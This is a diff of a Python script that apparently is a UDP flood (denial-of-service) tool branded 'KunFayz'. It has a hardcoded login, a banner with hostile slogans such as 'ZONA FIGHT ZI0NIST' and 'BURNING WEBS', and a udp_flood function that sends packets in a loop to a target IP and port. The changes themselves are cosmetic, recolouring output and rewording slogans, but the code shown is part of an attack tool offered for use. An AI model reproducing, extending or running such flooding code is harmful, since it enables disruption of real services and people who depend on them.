@@ -33,12 +33,12 @@ print(f"\033[97m║ \033[100m{' ' * 4}v.1.0{' ' * 77}\033[0m ║")
 print(f"\033[97m║ \033[100m{' ' * 4}https://www.https//kunkaffa@gmail.com{' ' * 45}\033[0m ║")
 print(f"\033[97m╚{'═' * 88}╝")
 while attemps < 100:
-    print("\033[103m┏━━KunFayz━━⬣")
-    username = input("\033[32m┗> Enter your username: \033[32m ")
-    password = input("\033[32m┗> Enter your password: \033[32m")
+    print("\033[38;5;6mm┏━━KunFayz━━⬣")
+    username = input("\033[38;5;6m┗> Enter your username: \033[32m")
+    password = input("\033[38;5;6m┗> Enter your password: \033[32m")
 
     if username == 'pekat' and password == 'malam':
-        print("\033[100m \033[31m••> ZONA FIGHT ZI0NIST \033[0m")
+        print("\033[100m \033[31m••> BURNING WEBS 210πiS \033[0m")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -82,8 +82,8 @@ def udp_flood(ip, port, message, duration):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(f"\033[48;5;7m\033[38;5;0m {packet_count}\033[0m \033[38;5;2mSend messages to the server \033[48;5;7m" +str(ip)+ "\033[33minfo running")
-            print(f"\033[38mSend messages to the server \033[38;5;1m" +str(ip)+ "")
+            print(f"\033[48;5;7m\033[38;5;0m {packet_count}\033[0m \033[38;5;6mSend messages to the server \033[48;5;7m" +str(ip)+ "\033[33minfo running")
+            print(f"[][][][][][] \033[38mSend messages to the server \033[38;5;1m" +str(ip)+ "")
         except socket.error:
             # Jika soket tidak dapat mengirim paket, hentikan loop
             break
